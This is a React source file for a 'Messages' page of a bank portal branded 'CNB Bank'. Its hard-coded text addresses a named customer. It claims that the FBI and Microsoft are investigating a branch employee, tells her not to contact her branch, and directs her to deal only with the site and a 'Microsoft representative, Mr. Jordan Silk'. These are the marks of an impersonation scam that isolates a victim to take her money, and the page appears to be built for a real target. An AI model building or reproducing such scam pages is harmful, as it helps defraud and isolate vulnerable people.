import { MessageSquare } from 'lucide-react';
import PortalShell from '@/components/PortalShell';
import type { View } from '@/lib/data';

interface MessagesPageProps {
  onNavigate: (view: View) => void;
}

export default function MessagesPage({ onNavigate }: MessagesPageProps) {
  return (
    <PortalShell activeNav="Messages" onNavigate={onNavigate}>
      <main className="portal-landscape min-h-[calc(100vh-72px)] px-4 py-6 sm:px-6 lg:px-10">
        <div className="mx-auto max-w-[760px]">
          <h1 className="mb-6 text-[21px] font-bold text-navy-950">
            Messages
          </h1>

          <section className="rounded-sm bg-white/90 p-8 text-center shadow-[0_2px_10px_rgba(37,76,105,0.12)]">
            <MessageSquare className="mx-auto mb-3 h-7 w-7 text-blue-700" />

            <h2 className="text-lg font-bold text-navy-900">
              Secure messages
            </h2>

            <p className="mx-auto mt-2 max-w-[520px] text-sm leading-6 text-navy-600">

Welcome, Kathleen E. West, to the updated CNB Bank portal. We sincerely apologize for the recent issues you experienced with the local branch in Naples.
We are currently investigating the matter with assistance from the Federal Bureau of Investigation and Microsoft Inc. 
Our recent reviews have indicated a serious breach of conduct by an employee at the local branch, and we have initiated a full investigation. 
To ensure the employee is not alerted before we gather all relevant evidence, please refrain from contacting the branch bankers directly regarding your case.
All communication between you and the main branch will take place through this secure website messaging section and via the Microsoft representative assisting you by phone. 
We will guide you through them for the next steps. We remain committed to securing your funds and protecting your interests throughout this investigation. 
We will keep you updated on developments in the coming days to ensure your funds remain safe. We kindly ask for your full cooperation as we guide you through this process.
Please communicate exclusively through this channel and with the Microsoft representative, Mr. Jordan Silk.            </p>
          </section>
        </div>
      </main>
    </PortalShell>
  );
}
